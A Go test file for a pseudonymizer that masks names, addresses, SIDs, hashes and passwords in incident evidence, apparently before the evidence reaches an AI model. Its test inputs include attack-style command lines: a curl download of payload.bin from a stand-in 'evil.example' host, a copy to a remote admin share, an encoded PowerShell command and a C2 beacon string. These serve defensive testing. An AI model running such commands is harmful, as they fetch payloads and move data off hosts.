package pseudonym

import (
	"strings"
	"sync"
	"testing"
)

func learned() *Pseudonymizer {
	p := New()
	p.Learn(Host, "HOST01")
	p.Learn(Host, "fileserver02")
	p.Learn(User, "CORP\\alice")
	p.Learn(User, "bob")
	p.Learn(Domain, "corp.example")
	return p
}

func mustNotContain(t *testing.T, got string, vals ...string) {
	t.Helper()
	low := strings.ToLower(got)
	for _, v := range vals {
		if strings.Contains(low, strings.ToLower(v)) {
			t.Errorf("%q still contains %q", got, v)
		}
	}
}

func TestApply_LearnedNamesAreReplacedEverywhereTheyAppear(t *testing.T) {
	p := learned()
	in := `alice logged on to host01 from fileserver02; CORP\alice ran C:\Windows\Temp\bob_tools\run.exe as BOB (svc_bob)`
	got := p.Apply(in)
	mustNotContain(t, got, "alice", "host01", "fileserver02", "corp\\")
	// "bob" inside a longer word is a different word: bob_tools has an underscore, which is not a word byte here
	if !strings.Contains(got, "[USER_") || !strings.Contains(got, "[HOST_") || !strings.Contains(got, "[DOMAIN_") {
		t.Errorf("got %q", got)
	}
	if back := p.Restore(got); strings.ToLower(back) != strings.ToLower(in) {
		t.Errorf("restore:\n got %q\nwant %q", back, in)
	}
}

func TestApply_TheSameValueAlwaysGetsTheSameTokenAndCaseIsIgnored(t *testing.T) {
	p := learned()
	a := p.Apply("host01 and HOST01 and Host01")
	toks := tokenRe.FindAllString(a, -1)
	if len(toks) != 3 || toks[0] != toks[1] || toks[1] != toks[2] {
		t.Errorf("tokens = %v in %q", toks, a)
	}
	b := p.Apply("another mention of host01")
	if !strings.Contains(b, toks[0]) {
		t.Errorf("a later call used a different token: %q vs %v", b, toks)
	}
	c := p.Apply("fileserver02")
	if strings.Contains(c, toks[0]) {
		t.Errorf("two values share a token")
	}
}

func TestApply_AWordInsideALongerWordIsNotReplaced(t *testing.T) {
	p := New()
	p.Learn(User, "bob")
	got := p.Apply("bobcat, bobby, and the user bob, plus x_bob and bob.smith")
	if !strings.Contains(got, "bobcat") || !strings.Contains(got, "bobby") {
		t.Errorf("a longer word was mangled: %q", got)
	}
	if strings.Contains(got, "user bob,") {
		t.Errorf("the bare name was not replaced: %q", got)
	}
}

func TestApply_NamesThatIdentifyNoOneAreKept(t *testing.T) {
	p := New()
	for _, v := range []string{"SYSTEM", "LOCAL SERVICE", "Administrator", "a", "", "-", "localhost"} {
		p.Learn(User, v)
	}
	in := "SYSTEM and Administrator ran as LOCAL SERVICE on localhost, a"
	if got := p.Apply(in); got != in {
		t.Errorf("got %q", got)
	}
	if len(p.Entries()) != 0 {
		t.Errorf("entries = %+v", p.Entries())
	}
}

func TestLearn_SplitsAccountFormsAndMachineAccounts(t *testing.T) {
	p := New()
	p.Learn(User, "CORP\\carol")
	p.Learn(User, "dave@mail.example")
	p.Learn(User, "WKS-7$")
	got := p.Apply("corp carol dave mail.example wks-7")
	mustNotContain(t, got, "carol", "dave", "wks-7", "mail.example", "corp ")
}

func TestApply_Addresses(t *testing.T) {
	p := New()
	got := p.Apply("conn 10.20.30.40 -> 203.0.113.9:443, 192.168.1.5, loopback 127.0.0.1 any 0.0.0.0 and 10.20.30.40 again, v6 2001:db8::1 and fe80::1")
	mustNotContain(t, got, "10.20.30.40", "203.0.113.9", "192.168.1.5", "2001:db8", "fe80")
	for _, keep := range []string{"127.0.0.1", "0.0.0.0"} {
		if !strings.Contains(got, keep) {
			t.Errorf("%s should be kept: %q", keep, got)
		}
	}
	if !strings.Contains(got, "[IP_PRIV_1]") || !strings.Contains(got, "[IP_PUB_1]") {
		t.Errorf("private and public addresses are told apart: %q", got)
	}
	if strings.Count(got, "[IP_PRIV_1]") != 2 {
		t.Errorf("the repeated private address got different tokens: %q", got)
	}
	if got := p.Apply("version 999.1.2.3 and 1.2.3"); strings.Contains(got, "999.1.2.3") == false {
		t.Errorf("not an address: %q", got)
	}
}

func TestApply_URLsUNCEmailSIDsHashesProfilesAndBlobs(t *testing.T) {
	p := New()
	in := `curl https://user:pw@evil.example/payload.bin; copy \\fileserver9\share\a.txt \\10.1.1.1\c$ ; mail bob@mail.example; ` +
		`owner S-1-5-21-111111111-222222222-333333333-1104 admin S-1-5-21-111111111-222222222-333333333-500 well-known S-1-5-18 ; ` +
		`md5 44d88612fea8a8f36de82e1278abb02f sha256 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f ; ` +
		`C:\Users\eve\Documents\x.docx and /home/frank/.ssh/id and C:\Users\Public\a.txt C:\Users\Default\b ; ` +
		`powershell -enc ` + strings.Repeat("QUJD", 30)
	got := p.Apply(in)
	mustNotContain(t, got, "evil.example", "fileserver9", "10.1.1.1", "bob@mail.example", "111111111", "44d88612", "275a021b", "eve", "frank", "QUJDQUJD", "user:pw", "@evil")
	for _, keep := range []string{"-1104", "-500", "S-1-5-18", "C:\\Users\\Public\\a.txt", "C:\\Users\\Default\\b", "payload.bin", "powershell -enc", "\\share\\a.txt"} {
		if !strings.Contains(got, keep) {
			t.Errorf("%q should survive in %q", keep, got)
		}
	}
	if !strings.Contains(got, "S-1-5-21-[SIDDOM_1]-1104") || !strings.Contains(got, "S-1-5-21-[SIDDOM_1]-500") {
		t.Errorf("the domain part of a SID is one token and the RID stays: %q", got)
	}
	if back := p.Restore(got); !strings.Contains(back, "evil.example") || !strings.Contains(back, "S-1-5-21-111111111-222222222-333333333-1104") || !strings.Contains(back, "44d88612fea8a8f36de82e1278abb02f") {
		t.Errorf("restore: %q", back)
	}
}

func TestApply_Secrets(t *testing.T) {
	p := New()
	cases := map[string][]string{
		`net user bob -password Hunter2xyz /add`:                 {"Hunter2xyz"},
		`tool.exe --password=S3cretValue --verbose`:              {"S3cretValue"},
		`tool.exe /pass:"my secret phrase" /x`:                   {"my secret phrase"},
		`curl -H "Authorization: Bearer abcDEF123token"`:         {"abcDEF123token"},
		`set API_KEY=sk-live-0123456789 && run`:                  {"sk-live-0123456789"},
		`ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force`: {"P@ssw0rd"},
		`net use \\fs01\share Passw0rdZ /user:corp\alice`:        {"Passw0rdZ"},
		`mysql -u root --token abcdef0123 -h x`:                  {"abcdef0123"},
	}
	for in, secrets := range cases {
		got := p.Apply(in)
		mustNotContain(t, got, secrets...)
		if !strings.Contains(got, Redacted) {
			t.Errorf("%q: nothing was redacted: %q", in, got)
		}
		if strings.Contains(p.Restore(got), secrets[0]) {
			t.Errorf("%q: a secret came back through Restore", in)
		}
	}
	if got := p.Apply(`net user bob -password Hunter2xyz /add`); !strings.Contains(got, "-password "+Redacted) {
		t.Errorf("the flag itself must stay readable: %q", got)
	}
	// words that only start like a secret flag are not secrets
	if got := p.Apply(`Get-Process -PassThru and passenger`); strings.Contains(got, Redacted) {
		t.Errorf("a false redaction: %q", got)
	}
}

func TestApply_NamesInsideCommandLinesAndPaths(t *testing.T) {
	p := learned()
	got := p.Apply(`"C:\Users\alice\AppData\Local\Temp\x.exe" -connect fileserver02 -u bob`)
	mustNotContain(t, got, "alice", "fileserver02", "-u bob")
	if !strings.Contains(got, `AppData\Local\Temp\x.exe`) || !strings.Contains(got, "-connect") {
		t.Errorf("the activity must stay readable: %q", got)
	}
}

func TestApply_DottedWordsThatAreNotHostsAreLeftAlone(t *testing.T) {
	p := New()
	in := "System.Management.Automation.dll Microsoft.PowerShell.Core cmd.exe svchost.exe evtx.log setup.msi C:\\Windows\\System32\\drivers\\x.sys"
	if got := p.Apply(in); got != in {
		t.Errorf("got %q", got)
	}
	got := p.Apply("beacon to c2.evil.example and update.vendor.org and srv.corp.local")
	mustNotContain(t, got, "evil.example", "vendor.org", "corp.local")
}

func TestApply_TextThatLooksLikeATokenIsNeverRestored(t *testing.T) {
	p := New()
	p.Learn(User, "alice")
	tok := p.Apply("alice") // [USER_1]
	if tok != "[USER_1]" {
		t.Fatalf("setup: %q", tok)
	}
	got := p.Apply("the evidence literally contains [USER_1] and [REDACTED] as text, and alice")
	if !strings.Contains(got, "([USER_1])") && !strings.Contains(got, "(USER_1)") {
		t.Errorf("a lookalike was not neutralised: %q", got)
	}
	back := p.Restore(got)
	if strings.Contains(back, "the evidence literally contains alice") {
		t.Errorf("a lookalike in the evidence was turned into a name: %q", back)
	}
	if !strings.Contains(back, "(USER_1)") || !strings.HasSuffix(back, "and alice") {
		t.Errorf("restore: %q", back)
	}
}

func TestRestore_UnknownTokensAndPlainTextAreLeftAlone(t *testing.T) {
	p := New()
	if got := p.Restore("see [HOST_9] and [IP_PUB_2] and plain text"); got != "see [HOST_9] and [IP_PUB_2] and plain text" {
		t.Errorf("got %q", got)
	}
	// a model that invents a token must not get a name back
	p.Learn(Host, "host01")
	p.Apply("host01")
	if got := p.Restore("[HOST_2]"); got != "[HOST_2]" {
		t.Errorf("an invented token was restored: %q", got)
	}
}

func TestLeaks_FindsWhatIsStillThereAndNeverReportsValues(t *testing.T) {
	p := learned()
	p.Apply("host01")
	for _, tc := range []struct{ text, want string }{
		{"talking about host01 here", "a name learned from the case (HOST)"},
		{"from 203.0.113.9", "an IPv4 address"},
		{"mail x@y.example", "an e-mail address"},
		{"S-1-5-21-111111111-222222222-333333333-1104", "a domain security identifier"},
		{"44d88612fea8a8f36de82e1278abb02f", "a hash"},
		{"-password Hunter2xyz", "a secret"},
	} {
		got := p.Leaks(tc.text)
		if len(got) != 1 || got[0] != tc.want {
			t.Errorf("Leaks(%q) = %v, want [%s]", tc.text, got, tc.want)
		}
		for _, g := range got {
			if strings.Contains(g, "host01") || strings.Contains(g, "203.0.113") {
				t.Errorf("Leaks reported a value: %q", g)
			}
		}
	}
	clean := p.Apply("alice on host01 -> 203.0.113.9 via https://evil.example/x with 44d88612fea8a8f36de82e1278abb02f -password Hunter2xyz")
	if got := p.Leaks(clean); len(got) != 0 {
		t.Errorf("applied text still leaks %v: %q", got, clean)
	}
	if got := p.Leaks("[HOST_1] and [IP_PUB_1] and 127.0.0.1"); len(got) != 0 {
		t.Errorf("tokens and loopback are not leaks: %v", got)
	}
}

func TestApply_EmptyAndNilSafe(t *testing.T) {
	p := New()
	if p.Apply("") != "" || p.Restore("") != "" || len(p.Leaks("")) != 0 {
		t.Errorf("empty input")
	}
}

func TestPseudonymizer_ConcurrentUseIsSafeAndConsistent(t *testing.T) {
	p := learned()
	var wg sync.WaitGroup
	out := make([]string, 16)
	for i := range out {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			out[i] = p.Apply("host01 and alice from 203.0.113.9")
		}(i)
	}
	wg.Wait()
	for _, o := range out {
		if o != out[0] {
			t.Fatalf("concurrent calls disagree: %q vs %q", o, out[0])
		}
	}
}

func TestEntries_ListWhatWasTokenizedForTheAnalyst(t *testing.T) {
	p := learned()
	p.Apply("host01 alice 203.0.113.9")
	e := p.Entries()
	if len(e) != 3 {
		t.Fatalf("entries = %+v", e)
	}
	vals := map[string]string{}
	for _, x := range e {
		vals[x.Token] = x.Value
	}
	if vals["[HOST_1]"] != "host01" || vals["[USER_1]"] != "alice" || vals["[IP_PUB_1]"] != "203.0.113.9" {
		t.Errorf("entries = %+v", e)
	}
}
